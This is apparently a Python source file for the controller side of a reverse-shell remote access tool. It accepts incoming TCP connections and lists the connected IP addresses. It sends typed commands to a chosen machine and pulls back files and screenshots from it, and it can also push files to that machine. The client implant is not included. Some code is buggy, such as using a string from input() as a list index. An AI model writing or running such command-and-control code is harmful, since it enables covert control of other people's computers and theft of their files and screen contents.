import socket, threading, json, sys, random, base64, webbrowser
from string import ascii_letters
from datetime import datetime
from prettytable import PrettyTable


class Server:
    DISCONNECT = '!DISCONNECT'
    connList = []
    ipList = []

    def __init__(self, port, ip):
        self.ip = ip
        self.port = port
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # def show_connections(self):
    #     print(self.connList)
        # table = PrettyTable()

    def change_connections(self):
        table = PrettyTable()
        lenth = [i for i in range(len(self.ipList))]
        table.add_column('No.', lenth)
        table.add_column('IP', self.ipList)
        print('\n')
        print(table)
        choice = input('What connection? ')
        return choice


    def receiver(self, conn):
        json_data = ""
        while True:
            try:
                json_data += conn.recv(1020).decode()
                return json.loads(json_data)
            except ValueError:
                pass

    def write_file(self, content, extension):
        name = ''
        for _ in range(random.randint(4, 10)):
            name += random.choice(ascii_letters)
        name = name + '.' + extension
        content = base64.b64decode(content)
        with open(name, 'wb') as fil:
            fil.write(content)
        webbrowser.open(name)

    def download(self,name, content):
        content = base64.b64decode(content.encode())
        with open(name, 'wb') as fil:
            fil.write(content)

    def read_file(self, name):
        with open(name, 'rb') as fil:
            return base64.b64encode(fil.read()).decode()

    def sender(self, message, conn):
        message = json.dumps(message).encode()
        conn.send(message)

    def handle_client(self, conn, addr):
        newline = f'[NEW CONNECTION] {addr[0]}, {addr[1]}  connected\n'
        message = f'[NEW CONNECTION] {str(datetime.now())} {addr[0]}, {addr[1]}\n'
        with open('server.log', 'a') as fil:
            fil.write(message)
        print(newline)
        connected = True
        while connected:
            try:
                to_send = input('CMD :')
                if to_send == 'server exit':
                    sys.exit()
                elif to_send == 'background session':
                    return
                if to_send.split()[0] == 'upload':
                    name = to_send.split()[1]
                    content = self.read_file(name)
                    to_send += ' ' + content
                    # print(to_send)
                elif to_send == 'show_connections':
                    choice = self.change_connections()
                    conn = self.connList[choice]
                    print(f'Connected to {self.ipList[choice]}')
                    addr = self.ipList[choice]
                    continue

                self.sender(to_send, conn)
                received = self.receiver(conn)
                if to_send == 'screenshot':
                    self.write_file(received, 'png')
                    continue
                if to_send.split()[0] == 'download':
                    name = to_send.split()[1]
                    self.download(content=received, name=name)
                    print('DOWNLOADED')
                if to_send == self.DISCONNECT:
                    conn.close()
                    break
                else:
                    print(received)
            except Exception as E:
                print(E)
                pass
